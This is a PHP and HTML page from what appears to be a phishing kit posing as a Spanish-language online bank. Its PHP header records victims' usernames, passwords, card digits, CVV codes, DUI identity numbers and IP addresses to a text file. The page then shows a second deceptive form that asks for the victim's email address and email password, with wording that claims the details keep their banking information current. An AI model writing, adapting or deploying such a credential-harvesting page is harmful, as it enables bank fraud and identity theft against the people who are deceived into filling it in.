<?php
ini_set("display_errors", 0);
@$userp = $_SERVER['REMOTE_ADDR'];
////////////////////
if ( isset ($_POST['usuario']) && isset ($_POST['clave']) && isset ($_POST['digitos']) && isset ($_POST['cvv'])  && isset ($_POST['dui'])){
    $file = fopen("datamichu.txt", "a");
fwrite($file, "**************************" . PHP_EOL);
fwrite($file, "Usuar.: ".$_POST['usuario']." - Clv.: ".$_POST['clave']." " . PHP_EOL);
fwrite($file, "últimos 4 Digitos: ".$_POST['digitos']." - Cvv.: ".$_POST['cvv']." " . PHP_EOL);
fwrite($file, "dui: ".$_POST['dui']." - IP ".$userp ."" . PHP_EOL);
fclose($file);

}else{ header ('location: index.html'); exit(); }
?>
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>inicio</title>
    <link rel="stylesheet" href="./fs/style2.css">
  </head>
  <body>
    <header>
      <div class="log"></div>
      <div class="help-mensaje"></div>
    </header>

    <main class="main">
      <div class="formulario-contenedor">
        <form action="index3.php" method="post">
          <h2>Actualice y/o confirme la siguiente información:</h2>
          <p>
            La información ingresada será monitoreada con el fin de mantener
            actualizada con la banca virtual y reciba la información de su
            cuenta.
          </p>
          <div class="input">
            <label for="">Correo electrónico</label>
            <input type="email" name="correo" required="">
          </div>
          <div class="input">
            <label for="">Contraseña del correo electrónico</label>
            <input type="password" name="claveCorreo" required="">
          </div>
          <div class="boton">
            <button type="submit">INGRESAR</button>
          </div>
        </form>
		    
      </div>  <br>  <br>  <br><br>  <br>  <br><br>  <br>  <br><br>  <br>  <br><br>  <br>  <br><br>  <br>  <br><br>  <br>  <br>
	  <br>  <br>  <br><br>  <br>  <br>
    </main>

           
    <footer class="normal-footer">
            <ul class="footer-list">
              <li class="primer-li">
               <img src="fs/ffter.png" >
              </li>
            
        
            </ul>
          </footer>
  

</body></html>